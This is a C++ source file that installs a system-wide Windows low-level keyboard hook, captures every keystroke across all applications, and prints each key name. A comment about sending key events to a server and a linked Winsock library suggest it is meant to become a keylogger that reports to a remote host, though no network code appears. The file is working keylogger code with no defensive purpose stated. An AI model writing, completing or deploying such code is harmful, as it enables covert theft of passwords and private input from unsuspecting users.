#include "keyboard_track.h"
#pragma comment(lib, "ws2_32.lib")

//https://stackoverflow.com/questions/38100667/windows-virtual-key-codes
std::wstring VirtualKeyCodeToString(UCHAR virtualKey)
{
	UINT scanCode = MapVirtualKey(virtualKey, MAPVK_VK_TO_VSC);

	char szName[32];
	int result = 0;
	switch (virtualKey)
	{
	case VK_LEFT: case VK_UP: case VK_RIGHT: case VK_DOWN:
	case VK_RCONTROL: case VK_RMENU:
	case VK_LWIN: case VK_RWIN: case VK_APPS:
	case VK_PRIOR: case VK_NEXT:
	case VK_END: case VK_HOME:
	case VK_INSERT: case VK_DELETE:
	case VK_DIVIDE:
	case VK_NUMLOCK:
		scanCode |= KF_EXTENDED;
	default:
		result = GetKeyNameTextA(scanCode << 16, szName, 32);
	}

	int len = MultiByteToWideChar(CP_ACP, 0, szName, -1, NULL, 0);
	std::wstring wstr(len, 0);
	MultiByteToWideChar(CP_ACP, 0, szName, -1, &wstr[0], len);
	return wstr;
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		
				
		// Get the key code and key state
		int keyCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;

		bool isKeyDown = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);

		//Get the name of virtual key code
		std::wstring name = VirtualKeyCodeToString(keyCode);

		// Print the key code and character to the console OR // Send the key event to the server
		//######################################################################################
		if (isKeyDown) {
			std::wcout << name << "\n";
		}

		
		//######################################################################################

		//std::cout << std::to_string((char)keyCode) << ((isKeyDown) ? " :down\n" : " :up\n");
	}

	// Call the next hook in the chain
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void tracking_keyboard() {
	// Set up a keyboard hook
	HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

	// Enter the message loop to keep the hook active
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// Remove the keyboard hook
	UnhookWindowsHookEx(keyboardHook);
}